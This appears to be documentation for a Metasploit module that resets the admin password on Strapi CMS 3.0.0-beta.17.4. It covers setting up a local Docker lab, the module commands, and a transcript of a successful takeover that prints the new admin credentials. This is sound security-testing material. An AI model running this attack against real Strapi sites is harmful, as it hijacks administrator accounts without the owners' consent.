## Vulnerable Application

This module abuses the mishandling of a password reset request for 
Strapi CMS version 3.0.0-beta.17.4 to change the password of the admin user.

Successfully tested against Strapi CMS version 3.0.0-beta.17.4.

### Install


```
docker run -it -p 1337:1337 --rm node:16 /bin/bash
export CXXFLAGS="-std=c++17"
# Complete the quickstart
npm install -g create-strapi-app@3.0.0-beta.17.4 && create-strapi-app yourProjectName
```

Navigate to http://localhost:1337/ to verify the application is running. Now create the first admin account at http://localhost:1337/admin

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/strapi_3_password_reset`
1. Do: `set new_password testtesttest`
1. Do: `set rport 1337`
1. Do: `set rhosts 127.0.0.1`
1. Do: `run`
1. You should be able to reset the admin users password

## Options

### NEW_PASSWORD

New Admin password. No default.

## Scenarios

### npx install of strapi 3.0.0-beta.17.4

```
msf6 > use auxiliary/scanner/http/strapi_3_password_reset
msf6 auxiliary(scanner/http/strapi_3_password_reset) > set new_password testtesttest
new_password => testtesttest
msf6 auxiliary(scanner/http/strapi_3_password_reset) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(scanner/http/strapi_3_password_reset) > set rport 1337
rport => 1337
msf6 auxiliary(scanner/http/strapi_3_password_reset) > check
[-] This module does not support check.
msf6 auxiliary(scanner/http/strapi_3_password_reset) > run

[*] Resetting admin password...
[+] Password changed successfully!
[+] User: superadminuser
[+] Email: none@none.com
[+] PASSWORD: testtesttest
[*] Auxiliary module execution completed
```
